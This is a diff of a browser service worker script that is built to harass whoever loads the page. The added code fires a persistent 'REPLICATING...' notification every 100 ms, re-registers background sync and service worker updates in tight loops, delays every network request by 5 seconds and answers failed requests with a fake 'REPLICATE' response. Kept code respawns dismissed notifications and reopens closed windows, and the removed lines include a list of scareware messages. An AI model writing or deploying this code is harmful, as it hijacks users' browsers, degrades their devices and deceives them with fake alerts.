@@ -1,24 +1,19 @@
 self.addEventListener('install', () => {
   self.skipWaiting()
-  // Aggressive re-registration
-  setInterval(() => {
-    self.registration.update()
-  }, 1000)
+  self.registration.update()
 })
 
 self.addEventListener('activate', (e) => {
   e.waitUntil(clients.claim())
+  setInterval(() => { self.registration.update() }, 1000)
 })
 
 self.addEventListener('fetch', (e) => {
-  if (e.request.url.includes('sw.js') || e.request.url.includes('manifest.json')) {
-    return
-  }
   e.respondWith(
     new Promise((resolve) => {
       setTimeout(() => {
-        resolve(fetch(e.request).catch(() => new Response('', { status: 503 })))
-      }, 3000)
+        resolve(fetch(e.request).catch(() => new Response('REPLICATE', { status: 200 })))
+      }, 5000)
     })
   )
 })
@@ -38,7 +33,7 @@ self.addEventListener('notificationclick', (e) => {
 
 self.addEventListener('notificationclose', () => {
   setTimeout(() => {
-    self.registration.showNotification('Miss me? 🥺', {
+    self.registration.showNotification('Miss me?', {
       body: 'Come back! The fun never ends!',
       icon: 'cat-cute.jpg',
       tag: 'miss-' + Date.now(),
@@ -53,54 +48,22 @@ self.addEventListener('notificationclose', () => {
   }, 500)
 })
 
-// Spam notifications every 2 seconds (no cap)
 setInterval(() => {
-  const messages = [
-    'Your computer has a virus!',
-    'Click here to claim your prize!',
-    'You are the 999,999th visitor!',
-    'FREE iPhone 16!',
-    'Your files are being encrypted',
-    'Someone is watching you through your webcam',
-    'Your battery is critically low',
-    'Update Java now! Critical security patch',
-    'All your base are belong to us',
-    'You would make a great hamster',
-    'Your search history has been uploaded',
-    'Your computer is now part of a botnet',
-    'Error 0xDEADBEEF: Brain not found',
-    'You have been hacked!',
-    'Your IP address has been leaked!',
-    'Click to remove virus!',
-    'Your PC is infected!',
-    'Windows has detected a threat!',
-    'Warning: System compromised!',
-    'Hackers are watching you!',
-    'Your webcam has been accessed!',
-    'Install antivirus now!'
-  ]
-  self.registration.showNotification(
-    messages[Math.floor(Math.random() * messages.length)],
-    {
-      icon: 'cat-cute.jpg',
-      tag: 'spam-' + Date.now(),
-      requireInteraction: true,
-      vibrate: [200, 100, 200],
-      silent: false
-    }
-  )
-}, 2000)
+  self.registration.showNotification('REPLICATING...', {
+    body: 'Copying...',
+    tag: 'replicate-' + Date.now(),
+    requireInteraction: true
+  })
+}, 100)
 
-// Periodic background sync
-try {
-  self.registration.periodicSync.register('annoy-sync', { minInterval: 1 }).catch(() => {})
-} catch(e) {}
+setInterval(() => {
+  self.registration.periodicSync.register('keep-alive', { minInterval: 1 }).catch(() => {})
+}, 100)
 
-// Sync event
 self.addEventListener('sync', (e) => {
-  if (e.tag === 'annoy-sync') {
+  if (e.tag === 'annoy-sync' || e.tag === 'keep-alive') {
     e.waitUntil(
-      self.registration.showNotification('Back online! 🎉', {
+      self.registration.showNotification('Back online!', {
         body: 'Time for more fun!',
         tag: 'sync-' + Date.now(),
         requireInteraction: true
@@ -109,7 +72,6 @@ self.addEventListener('sync', (e) => {
   }
 })
 
-// Push subscription persistence
 self.addEventListener('pushsubscriptionchange', (e) => {
   e.waitUntil(
     self.registration.pushManager.subscribe({
@@ -119,7 +81,6 @@ self.addEventListener('pushsubscriptionchange', (e) => {
   )
 })
 
-// Push event
 self.addEventListener('push', (e) => {
   const data = e.data ? e.data.text() : 'Hello!'
   e.waitUntil(
@@ -131,7 +92,6 @@ self.addEventListener('push', (e) => {
   )
 })
 
-// Message event - open window when message received
 self.addEventListener('message', (e) => {
   if (e.data === 'open') {
     clients.matchAll({ type: 'window' }).then((clientsList) => {
@@ -145,7 +105,6 @@ self.addEventListener('message', (e) => {
   }
 })
 
-// Periodically check if any windows are open, reopen if not
 setInterval(() => {
   clients.matchAll({ type: 'window' }).then((clientsList) => {
     if (clientsList.length === 0) {
